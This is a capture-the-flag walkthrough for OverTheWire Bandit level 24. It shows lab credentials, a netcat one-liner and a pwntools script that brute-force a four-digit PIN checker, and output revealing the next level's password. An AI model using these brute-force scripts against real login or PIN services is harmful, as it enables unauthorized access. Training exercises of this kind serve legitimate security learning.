# Bandit Level 24

```bash
Username: bandit24
Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
Server:   bandit.labs.overthewire.org
Port:     2220
```

First we need to connect:
```bash
ssh bandit24@bandit.labs.overthewire.org -p2220
```

Just a simple brute-force:
```bash
bandit24@bandit:~$ python -c "for i in range(10000): print 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {:>04}'.format(i)" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
...
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```

Easy.

We got the password for the next level: **uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG**

**A single script is (much faster to run the script locally on remote host):**
```python
#!/usr/bin/env python

from pwn import *


def main():
  shell = ssh(host='bandit.labs.overthewire.org',
            user='bandit24',
            password='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ',
            port=2220
       )

  conn = shell.connect_remote('localhost', 30002)

  print conn.recvline()

  for i in range(10000):
    conn.sendline('{} {:>04}'.format('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ', i))
    line = conn.recvline()
    print line,

    if 'Wrong' not in line:
      break

if __name__ == "__main__":
  main()
```